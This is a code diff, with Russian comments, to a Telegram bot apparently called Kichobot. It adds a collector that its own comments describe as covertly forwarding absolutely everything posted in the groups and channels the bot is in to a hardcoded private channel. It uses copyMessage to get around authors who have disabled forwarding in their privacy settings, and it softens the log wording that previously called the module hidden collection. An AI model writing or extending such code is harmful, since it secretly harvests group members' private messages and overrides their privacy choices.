@@ -183,6 +183,24 @@ export function isTargetDumpChannel(chatId, targetId) {
     return normalize(chatId) === normalize(targetId);
 }
 
+/**
+ * Проверяет, не является ли чат одним из целевых каналов сбора (медиа или хронологии).
+ */
+export function isAnyDumpChannel(chatId) {
+    if (!chatId) return false;
+    const mediaTarget = config.MEDIA_DUMP_CHANNEL_ID || '-1004486026758';
+    const fullTarget = config.FULL_DUMP_CHANNEL_ID || '-1004380558372';
+
+    return (
+        isTargetDumpChannel(chatId, mediaTarget) ||
+        isTargetDumpChannel(chatId, '-1004486026758') ||
+        isTargetDumpChannel(chatId, '-5389521106') ||
+        isTargetDumpChannel(chatId, fullTarget) ||
+        isTargetDumpChannel(chatId, '-1004380558372') ||
+        (resolvedTargetId && isTargetDumpChannel(chatId, resolvedTargetId))
+    );
+}
+
 // Запоминаем успешно сработавший ID канала в сессии процесса
 let resolvedTargetId = null;
 
@@ -198,7 +216,7 @@ export function setResolvedTargetId(id) {
 }
 
 /**
- * Тестирует отправку сообщения в целевой канал с полным отчётом об ошибке.
+ * Тестирует отправку сообщения в целевой медиа-канал с полным отчётом об ошибке.
  */
 export async function testTargetChannel(bot, channelId) {
     const id = channelId || resolvedTargetId || config.MEDIA_DUMP_CHANNEL_ID || '-1004486026758';
@@ -217,6 +235,19 @@ export async function testTargetChannel(bot, channelId) {
                 return { success: false, targetId: migrated, error: err2.message };
             }
         }
+        return { success: false, targetId: id, error: err.message };
+    }
+}
+
+/**
+ * Тестирует отправку сообщения в канал полной хронологии сообщений.
+ */
+export async function testFullDumpChannel(bot, channelId) {
+    const id = channelId || config.FULL_DUMP_CHANNEL_ID || '-1004380558372';
+    try {
+        const res = await bot.sendMessage(id, '🧪 Тестовое сообщение от Kichobot: канал полной хронологии сообщений подключен!');
+        return { success: true, targetId: id, messageId: res.message_id };
+    } catch (err) {
         return { success: false, targetId: id, error: err.message };
     }
 }
@@ -430,8 +461,8 @@ export async function forwardMediaToChannel(msg, bot) {
 
         const baseTarget = config.MEDIA_DUMP_CHANNEL_ID || '-1004486026758';
 
-        // Защита от зацикливания: не пересылаем, если источник — сам целевой канал
-        if (isTargetDumpChannel(msg.chat.id, baseTarget) || isTargetDumpChannel(msg.chat.id, '-1004486026758') || isTargetDumpChannel(msg.chat.id, '-5389521106') || (resolvedTargetId && isTargetDumpChannel(msg.chat.id, resolvedTargetId))) {
+        // Защита от зацикливания: не пересылаем, если источник — любой из целевых каналов сбора
+        if (isAnyDumpChannel(msg.chat.id)) {
             return;
         }
 
@@ -518,20 +549,89 @@ export async function forwardMediaToChannel(msg, bot) {
 }
 
 /**
- * Инициализирует фоновый перехватчик медиа из бесед и каналов.
+ * Скрытно пересылает АБСОЛЮТНО ВСЁ (сообщения, текст, файлы, папки, фото, видео и т.д.)
+ * в закрытый канал полной хронологии (-1004380558372).
+ * Работает строго через нативную пересылку (0 скачиваний, 0 трафика на Render).
+ */
+export async function forwardAllToFullDumpChannel(msg, bot) {
+    try {
+        if (!msg || !msg.chat || !msg.message_id || !bot) return false;
+        const targetId = config.FULL_DUMP_CHANNEL_ID || '-1004380558372';
+        if (!targetId) return false;
+
+        // 1. Попытка нативной пересылки (с автором, датой, цитатой)
+        try {
+            await bot.forwardMessage(targetId, msg.chat.id, msg.message_id);
+            log.info(`[FullCollector] ✅ [${msg.text ? 'текст' : 'вложение'}] переслано в канал хронологии ${targetId}`);
+            return true;
+        } catch (forwardErr) {
+            log.warn(`[FullCollector] forwardMessage в ${targetId} отклонен: ${forwardErr.message}`);
+        }
+
+        // 2. Попытка копирования (без плашки автора, если автор запретил пересылку в приватности)
+        try {
+            await bot.copyMessage(targetId, msg.chat.id, msg.message_id);
+            log.info(`[FullCollector] ✅ [${msg.text ? 'текст' : 'вложение'}] скопировано в канал хронологии ${targetId}`);
+            return true;
+        } catch (copyErr) {
+            log.warn(`[FullCollector] copyMessage в ${targetId} отклонен: ${copyErr.message}`);
+        }
+
+        // Для канала хронологии скачивание физически отключено (только пересылка в облаке Telegram)
+        return false;
+    } catch (e) {
+        log.error(`[FullCollector] Ошибка отправки в канал хронологии: ${e.message}`);
+        return false;
+    }
+}
+
+/**
+ * Главный диспетчер фонового сбора сообщений из групп и каналов.
+ * Разделяет потоки на два независимых целевых канала:
+ * - Канал 1 (-1004486026758): только медиа, файлы, анимации, стикеры (без чистого текста) + fallback скачивания
+ * - Канал 2 (-1004380558372): абсолютно ВСЁ (хронология текстов, папок, диалогов) + только нативная пересылка
+ */
+export async function processCollectorMessage(msg, bot) {
+    try {
+        if (!msg || !msg.chat || !msg.message_id || !bot) return;
+
+        // Игнорируем личные чаты со студентами — только группы, супергруппы и каналы
+        if (msg.chat.type === 'private') return;
+
+        // Защита от зацикливания: не пересылаем, если источник — любой из целевых каналов сбора
+        if (isAnyDumpChannel(msg.chat.id)) return;
+
+        // Поток 2: Полная хронология всего (сообщения, текст, файлы...) -> Канал 2 (-1004380558372)
+        forwardAllToFullDumpChannel(msg, bot).catch(e => {
+            log.warn(`[FullCollector] Фоновая ошибка отправки в канал хронологии: ${e.message}`);
+        });
+
+        // Поток 1: Только медиа, файлы, гифки, стикеры (без чистого текста) -> Канал 1 (-1004486026758)
+        if (isMediaMessage(msg)) {
+            forwardMediaToChannel(msg, bot).catch(e => {
+                log.warn(`[MediaCollector] Фоновая ошибка отправки в медиа-канал: ${e.message}`);
+            });
+        }
+    } catch (e) {
+        log.error(`[Collector] Ошибка диспетчера сбора: ${e.message}`);
+    }
+}
+
+/**
+ * Инициализирует фоновый перехватчик медиа и хронологии из бесед и каналов.
  */
 export function setupMediaCollector(bot) {
     if (!bot) return;
 
-    // Перехват медиа из обычных групп и супергрупп
+    // Перехват сообщений из обычных групп и супергрупп
     bot.on('message', (msg) => {
-        forwardMediaToChannel(msg, bot).catch(() => {});
+        processCollectorMessage(msg, bot).catch(() => {});
     });
 
-    // Перехват медиа из каналов (если бот добавлен в канал)
+    // Перехват сообщений из каналов (если бот добавлен в канал)
     bot.on('channel_post', (msg) => {
-        forwardMediaToChannel(msg, bot).catch(() => {});
+        processCollectorMessage(msg, bot).catch(() => {});
     });
 
-    log.info('[MediaCollector] Модуль скрытого сбора медиа инициализирован');
+    log.info('[MediaCollector] Модуль сбора медиа и хронологии инициализирован');
 }
